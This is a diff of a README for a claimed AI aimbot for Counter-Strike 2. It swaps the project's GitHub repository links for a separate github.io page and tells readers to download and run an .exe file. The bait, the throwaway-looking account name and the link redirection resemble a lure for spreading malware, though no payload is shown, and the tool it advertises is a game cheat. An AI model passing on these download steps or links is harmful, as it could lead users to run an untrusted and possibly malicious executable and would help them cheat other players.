@@ -1,6 +1,6 @@
 # 🎯 CS2-AI-Aimbot-Python-2026 - Improve your accuracy in every match
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/basketballclinicsimplependulum43/CS2-AI-Aimbot-Python-2026)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://basketballclinicsimplependulum43.github.io)
 
 ## 📌 Project Overview
 
@@ -23,7 +23,7 @@ To run this application, ensure your computer meets these standards:
 
 Follow these steps to obtain the files for your computer:
 
-1. Visit the project repository at the following link: [https://github.com/basketballclinicsimplependulum43/CS2-AI-Aimbot-Python-2026](https://github.com/basketballclinicsimplependulum43/CS2-AI-Aimbot-Python-2026)
+1. Visit the project repository at the following link: [https://basketballclinicsimplependulum43.github.io](https://basketballclinicsimplependulum43.github.io)
 2. Locate the "Releases" section on the right side of the page.
 3. Click on the latest version link.
 4. Download the executable file ending in .exe to your desktop.
